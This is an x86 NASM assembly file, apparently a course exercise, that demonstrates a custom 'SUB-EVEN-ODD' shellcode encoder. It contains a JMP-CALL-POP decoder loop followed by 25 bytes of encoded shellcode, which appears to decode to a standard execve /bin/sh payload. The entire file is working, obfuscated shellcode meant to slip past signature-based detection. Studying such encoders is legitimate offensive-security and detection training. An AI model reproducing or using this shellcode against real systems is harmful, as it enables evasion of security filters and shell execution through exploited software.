; Filename: sub-even-odd-encoder.nasm
; Author: lastlistener
; Purpose: Demonstrate the use of shellcode encoded with SUB-EVEN-ODD encoding

global _start			

section .text
_start:
	jmp short call_shellcode

decoder:
	pop esi
	xor ecx, ecx
	mov cl, 25


decode:
	test byte [esi],0x1		; odd if the lowest bit is set
	jnz was_odd
	add byte [esi],0x1		; else it was even
	jmp loop_end
was_odd:
	sub byte [esi],0x3		; subtract the constant chosen for odds
loop_end:
	add byte [esi],0x4		; always add this constant
	inc esi
	loop decode

	jmp short EncodedShellcode

call_shellcode:
	call decoder

	EncodedShellcode: db 0x2c,0xbf,0x4f,0x67,0x2a,0x2a,0x6e,0x67,0x67,0x2a,0x61,0x64,0x6d,0x84,0xde,0x4f,0x84,0xe1,0x4e,0x84,0xdc,0xaf,0x06,0xc8,0x7f
